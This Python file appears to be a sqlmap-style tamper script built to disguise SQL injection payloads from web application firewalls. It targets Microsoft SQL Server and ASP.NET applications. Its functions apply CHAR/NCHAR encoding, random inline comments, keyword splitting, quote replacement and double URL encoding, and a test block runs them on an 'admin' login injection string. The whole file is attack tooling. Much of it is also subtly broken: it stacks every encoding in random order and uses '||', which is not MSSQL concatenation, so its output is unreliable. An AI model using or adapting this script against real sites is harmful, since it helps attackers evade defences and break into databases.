import random
import string

def tamper(payload, **kwargs):
    """
    Advanced tamper script for Microsoft SQL Server 2017, Windows Server 2019, ASP.NET applications,
    and a generic WAF. Obfuscates payloads using encoding, splitting, and comments.
    """

    if payload:
        # List of tampering techniques
        techniques = [
            mssql_hex_encoding,
            mssql_unicode_encoding,
            comment_obfuscation,
            keyword_splitting,
            replace_single_quotes,
            double_url_encode,
        ]
        
        # Apply techniques randomly to make the payload more dynamic
        random.shuffle(techniques)
        for technique in techniques:
            payload = technique(payload)
    
    return payload


def mssql_hex_encoding(payload):
    """
    Encodes alphanumeric characters in hexadecimal format for MSSQL Server.
    Example: SELECT becomes CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
    """
    result = []
    for char in payload:
        if char.isalnum():
            result.append(f"CHAR({ord(char)})")
        else:
            result.append(char)
    return "+".join(result)


def mssql_unicode_encoding(payload):
    """
    Encodes characters using MSSQL Unicode format.
    Example: SELECT becomes NCHAR(83)+NCHAR(69)+NCHAR(76)+NCHAR(69)+NCHAR(67)+NCHAR(84)
    """
    result = []
    for char in payload:
        if char.isalnum():
            result.append(f"NCHAR({ord(char)})")
        else:
            result.append(char)
    return "+".join(result)


def comment_obfuscation(payload):
    """
    Adds inline comments to break up payload for bypassing WAF inspection.
    Example: SELECT -> S/*comment*/E/*comment*/L/*comment*/ECT
    """
    return "".join(
        f"{char}/*{random_comment()}*/" if char.isalpha() else char for char in payload
    )


def keyword_splitting(payload):
    """
    Splits SQL keywords using concatenation or spaces to evade WAF keyword matching.
    Example: SELECT -> SEL||ECT or S E L E C T
    """
    keywords = ["SELECT", "WHERE", "INSERT", "UPDATE", "DELETE", "DROP", "FROM"]
    for keyword in keywords:
        if keyword.upper() in payload.upper():
            parts = [char for char in keyword]
            if random.choice([True, False]):
                payload = payload.replace(keyword, "||".join(parts))
            else:
                payload = payload.replace(keyword, " ".join(parts))
    return payload


def replace_single_quotes(payload):
    """
    Replaces single quotes with their equivalent using MSSQL's CHAR function.
    Example: ' becomes CHAR(39)
    """
    return payload.replace("'", "CHAR(39)")


def double_url_encode(payload):
    """
    Applies double URL encoding to obfuscate payload further.
    Example: SELECT -> %25%53%25%45%25%4C%25%45%25%43%25%54
    """
    return "".join(f"%25{format(ord(char), 'X')}" for char in payload)


def random_comment():
    """
    Generates a random inline comment for obfuscation.
    """
    return "".join(random.choices(string.ascii_letters + string.digits, k=5))


# Example usage of the script (for testing purposes):
if __name__ == "__main__":
    test_payload = "SELECT * FROM Users WHERE Username='admin'"
    print("Original Payload:", test_payload)
    obfuscated_payload = tamper(test_payload)
    print("Obfuscated Payload:", obfuscated_payload)
